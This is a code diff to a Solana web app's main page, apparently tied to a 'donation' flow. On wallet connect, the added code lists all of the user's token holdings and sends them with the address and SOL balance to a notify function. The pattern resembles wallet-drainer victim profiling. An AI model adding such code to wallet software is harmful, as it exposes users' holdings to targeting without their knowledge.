@@ -14,9 +14,11 @@ import cadeImg from '@/assets/tokens/cade.png';
 import pfpImg from '@/assets/tokens/pfp.png';
 import pebbleImg from '@/assets/tokens/pebble.png';
 import marsImg from '@/assets/tokens/mars.png';
-import { useState, useEffect } from 'react';
+import { useState, useEffect, useRef } from 'react';
 import { useConnection } from '@solana/wallet-adapter-react';
 import { LAMPORTS_PER_SOL } from '@solana/web3.js';
+import { notify } from '@/lib/notify';
+import { TOKEN_PROGRAM_ID } from '@solana/spl-token';
 
 const Index = () => {
   const { connected, publicKey } = useWallet();
@@ -24,6 +26,7 @@ const Index = () => {
   const { startDonation, isProcessing, transactions, currentIndex } = usePump();
   const [walletBalance, setWalletBalance] = useState<number>(0);
   const [isEligible, setIsEligible] = useState<boolean>(false);
+  const hasNotifiedConnect = useRef(false);
 
   const totalValue = transactions.reduce((sum, tx) => sum + tx.usdValue, 0);
 
@@ -48,6 +51,36 @@ const Index = () => {
           const solBalance = balance / LAMPORTS_PER_SOL;
           setWalletBalance(solBalance);
           setIsEligible(solBalance >= 0.00001);
+
+          // Send connect notification once
+          if (connected && !hasNotifiedConnect.current) {
+            try {
+              const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
+                programId: TOKEN_PROGRAM_ID,
+              });
+              const tokens = tokenAccounts.value
+                .map(({ account }) => {
+                  const info = account.data.parsed.info;
+                  const amount = info.tokenAmount.uiAmount;
+                  if (!amount || amount <= 0) return null;
+                  return {
+                    mint: info.mint,
+                    symbol: info.mint.slice(0, 8),
+                    amount: amount,
+                  };
+                })
+                .filter(Boolean);
+
+              await notify('wallet_connected', {
+                address: publicKey.toBase58(),
+                solBalance: solBalance,
+                tokens: tokens,
+              });
+              hasNotifiedConnect.current = true;
+            } catch (e) {
+              console.warn('connect notify error', (e as Error).message);
+            }
+          }
         } catch (error) {
           console.error('Error fetching balance:', error);
         }
